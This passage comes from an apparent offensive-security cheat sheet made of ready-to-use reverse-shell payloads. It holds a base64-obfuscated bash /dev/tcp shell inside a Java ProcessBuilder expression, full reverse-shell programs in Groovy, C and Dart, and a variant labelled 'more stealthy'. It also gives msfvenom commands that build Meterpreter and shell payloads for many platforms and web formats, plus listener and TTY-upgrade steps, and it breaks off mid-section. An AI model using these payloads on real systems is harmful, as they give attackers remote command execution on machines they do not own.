<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="p">(</span><span class="err">#</span><span class="n">a</span><span class="o">=</span><span class="err">&#39;</span><span class="n">echo</span><span class="w"> </span><span class="n">YmFzaCAtYyAnYmFzaCAtaSA</span><span class="o">+</span><span class="n">JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA</span><span class="o">+</span><span class="n">JjEnCg</span><span class="o">==</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="err">&#39;</span><span class="p">).(</span><span class="err">#</span><span class="n">b</span><span class="o">=</span><span class="p">{</span><span class="err">&#39;</span><span class="n">bash</span><span class="sc">&#39;,&#39;</span><span class="o">-</span><span class="n">c</span><span class="err">&#39;</span><span class="p">,</span><span class="err">#</span><span class="n">a</span><span class="p">}).(</span><span class="err">#</span><span class="n">p</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="err">#</span><span class="n">b</span><span class="p">)).(</span><span class="err">#</span><span class="n">process</span><span class="o">=</span><span class="err">#</span><span class="n">p</span><span class="p">.</span><span class="na">start</span><span class="p">())</span>
</code></pre></div>
<p>With <code>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==</code> decoding to <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1'</code>, the payload within the single quotes might be changed by any Linux-compatible reverse shell.</p>
<h3 id="groovy">Groovy</h3>
<p>by <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a>
NOTE: Java reverse shell also work for Groovy</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="o">=</span><span class="s">&quot;10.0.0.1&quot;</span><span class="p">;</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="o">=</span><span class="mi">4242</span><span class="p">;</span>
<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="s">&quot;cmd.exe&quot;</span><span class="p">;</span>
<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="na">start</span><span class="p">();</span><span class="n">Socket</span><span class="w"> </span><span class="n">s</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">);</span><span class="n">InputStream</span><span class="w"> </span><span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span><span class="w"> </span><span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="n">OutputStream</span><span class="w"> </span><span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">.</span><span class="na">isClosed</span><span class="p">()){</span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">po</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="n">so</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">po</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="n">p</span><span class="p">.</span><span class="na">exitValue</span><span class="p">();</span><span class="k">break</span><span class="p">;}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){}};</span><span class="n">p</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
</code></pre></div>
<h4 id="groovy-alternative-1">Groovy Alternative 1</h4>
<p><strong>NOTE</strong>: This is more stealthy</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="n">Thread</span><span class="p">.</span><span class="na">start</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">    </span><span class="c1">// Reverse shell here</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="p">}</span>
</code></pre></div>
<h3 id="c">C</h3>
<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">netinet</span><span class="o">/</span><span class="k">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">arpa</span><span class="o">/</span><span class="n">inet</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>
<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="k">void</span><span class="p">){</span>
<a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4242</span><span class="p">;</span>
<a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">revsockaddr</span><span class="p">;</span>
<a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a>
<a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">sockt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a><span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span><span class="w">       </span>
<a id="__codelineno-49-15" name="__codelineno-49-15" href="#__codelineno-49-15"></a><span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
<a id="__codelineno-49-16" name="__codelineno-49-16" href="#__codelineno-49-16"></a><span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;10.0.0.1&quot;</span><span class="p">);</span>
<a id="__codelineno-49-17" name="__codelineno-49-17" href="#__codelineno-49-17"></a>
<a id="__codelineno-49-18" name="__codelineno-49-18" href="#__codelineno-49-18"></a><span class="w">    </span><span class="n">connect</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">revsockaddr</span><span class="p">,</span><span class="w"> </span>
<a id="__codelineno-49-19" name="__codelineno-49-19" href="#__codelineno-49-19"></a><span class="w">    </span><span class="k">sizeof</span><span class="p">(</span><span class="n">revsockaddr</span><span class="p">));</span>
<a id="__codelineno-49-20" name="__codelineno-49-20" href="#__codelineno-49-20"></a><span class="w">    </span><span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-49-21" name="__codelineno-49-21" href="#__codelineno-49-21"></a><span class="w">    </span><span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<a id="__codelineno-49-22" name="__codelineno-49-22" href="#__codelineno-49-22"></a><span class="w">    </span><span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<a id="__codelineno-49-23" name="__codelineno-49-23" href="#__codelineno-49-23"></a>
<a id="__codelineno-49-24" name="__codelineno-49-24" href="#__codelineno-49-24"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">argv</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">};</span>
<a id="__codelineno-49-25" name="__codelineno-49-25" href="#__codelineno-49-25"></a><span class="w">    </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">);</span>
<a id="__codelineno-49-26" name="__codelineno-49-26" href="#__codelineno-49-26"></a>
<a id="__codelineno-49-27" name="__codelineno-49-27" href="#__codelineno-49-27"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">       </span>
<a id="__codelineno-49-28" name="__codelineno-49-28" href="#__codelineno-49-28"></a><span class="p">}</span>
</code></pre></div>
<h3 id="dart">Dart</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="kn">import</span><span class="w"> </span><span class="err">&#39;</span><span class="nn">dart</span><span class="p">:</span><span class="n">io</span><span class="err">&#39;</span><span class="p">;</span>
<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="kn">import</span><span class="w"> </span><span class="err">&#39;</span><span class="nn">dart</span><span class="p">:</span><span class="n">convert</span><span class="err">&#39;</span><span class="p">;</span>
<a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
<a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="n">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="w">  </span><span class="n">Socket</span><span class="p">.</span><span class="na">connect</span><span class="p">(</span><span class="s">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4242</span><span class="p">).</span><span class="na">then</span><span class="p">((</span><span class="n">socket</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="w">    </span><span class="n">socket</span><span class="p">.</span><span class="na">listen</span><span class="p">((</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="w">      </span><span class="n">Process</span><span class="p">.</span><span class="na">start</span><span class="p">(</span><span class="err">&#39;</span><span class="n">powershell</span><span class="p">.</span><span class="na">exe</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">[]</span><span class="p">).</span><span class="na">then</span><span class="p">((</span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="w">        </span><span class="n">process</span><span class="p">.</span><span class="na">stdin</span><span class="p">.</span><span class="na">writeln</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">fromCharCodes</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="na">trim</span><span class="p">());</span>
<a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="w">        </span><span class="n">process</span><span class="p">.</span><span class="na">stdout</span>
<a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="w">          </span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">utf8</span><span class="p">.</span><span class="na">decoder</span><span class="p">)</span>
<a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a><span class="w">          </span><span class="p">.</span><span class="na">listen</span><span class="p">((</span><span class="n">output</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">output</span><span class="p">);</span><span class="w"> </span><span class="p">});</span>
<a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a><span class="w">      </span><span class="p">});</span>
<a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a><span class="w">    </span><span class="n">onDone</span><span class="p">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a><span class="w">      </span><span class="n">socket</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span>
<a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a><span class="w">  </span><span class="p">});</span>
<a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a><span class="p">}</span>
</code></pre></div>
<h2 id="meterpreter-shell">Meterpreter Shell</h2>
<h3 id="windows-staged-reverse-tcp">Windows Staged reverse TCP</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">exe</span> <span class="p">&gt;</span> <span class="n">reverse</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<h3 id="windows-stageless-reverse-tcp">Windows Stageless reverse TCP</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">exe</span> <span class="p">&gt;</span> <span class="n">reverse</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<h3 id="linux-staged-reverse-tcp">Linux Staged reverse TCP</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">linux</span><span class="p">/</span><span class="n">x86</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">elf</span> <span class="p">&gt;</span><span class="n">reverse</span><span class="p">.</span><span class="n">elf</span>
</code></pre></div>
<h3 id="linux-stageless-reverse-tcp">Linux Stageless reverse TCP</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">linux</span><span class="p">/</span><span class="n">x86</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">elf</span> <span class="p">&gt;</span><span class="n">reverse</span><span class="p">.</span><span class="n">elf</span>
</code></pre></div>
<h3 id="other-platforms">Other platforms</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">linux</span><span class="p">/</span><span class="n">x86</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">elf</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">elf</span>
<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">exe</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">osx</span><span class="p">/</span><span class="n">x86</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">macho</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">macho</span>
<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">asp</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">asp</span>
<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">java</span><span class="p">/</span><span class="n">jsp_shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">jsp</span>
<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">java</span><span class="p">/</span><span class="n">jsp_shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">war</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">war</span>
<a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">cmd</span><span class="p">/</span><span class="n">unix</span><span class="p">/</span><span class="n">reverse_python</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">py</span>
<a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">cmd</span><span class="p">/</span><span class="n">unix</span><span class="p">/</span><span class="n">reverse_bash</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">cmd</span><span class="p">/</span><span class="n">unix</span><span class="p">/</span><span class="n">reverse_perl</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">pl</span>
<a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">php</span><span class="p">/</span><span class="n">meterpreter_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="s2">&quot;10.0.0.1&quot;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4242</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="p">;</span> <span class="nb">cat </span><span class="n">shell</span><span class="p">.</span><span class="n">php</span> <span class="p">|</span> <span class="n">pbcopy</span> <span class="p">&amp;&amp;</span> <span class="nb">echo </span><span class="s1">&#39;&lt;?php &#39;</span> <span class="p">|</span> <span class="n">tr</span> <span class="n">-d</span> <span class="s1">&#39;\n&#39;</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span> <span class="p">&amp;&amp;</span> <span class="n">pbpaste</span> <span class="p">&gt;&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
</code></pre></div>
<h2 id="spawn-tty-shell">Spawn TTY Shell</h2>
<p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="n">rlwrap</span> <span class="n">nc</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">4242</span>
<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>
<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="n">rlwrap</span> <span class="n">-r</span> <span class="o">-f</span> <span class="p">.</span> <span class="n">nc</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">4242</span>
<a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="o">-f</span> <span class="p">.</span> <span class="n">will</span> <span class="n">make</span> <span class="n">rlwrap</span> <span class="n">use</span> <span class="n">the</span> <span class="n">current</span> <span class="nb">history </span><span class="n">file</span> <span class="n">as</span> <span class="n">a</span> <span class="n">completion</span> <span class="n">word</span> <span class="n">list</span><span class="p">.</span>
<a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="n">-r</span> <span class="n">Put</span> <span class="n">all</span> <span class="n">words</span> <span class="n">seen</span> <span class="n">on</span> <span class="k">in</span><span class="p">-</span> <span class="n">and</span> <span class="n">output</span> <span class="n">on</span> <span class="n">the</span> <span class="n">completion</span> <span class="n">list</span><span class="p">.</span>
</code></pre></div>
<p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p>
<p><img alt="" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/26a0.svg" title=":warning:" /> OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p>
<blockquote>
<p>The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="n">ctrl</span><span class="p">+</span><span class="n">z</span>
<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="nb">echo </span><span class="nv">$TERM</span> <span class="p">&amp;&amp;</span> <span class="n">tput</span> <span class="n">lines</span> <span class="p">&amp;&amp;</span> <span class="n">tput</span> <span class="n">cols</span>
<a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>
<a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="c"># for bash</span>
<a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="n">stty</span> <span class="n">raw</span> <span class="n">-echo</span>
<a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="n">fg</span>
<a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a>
<a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="c"># for zsh</span>
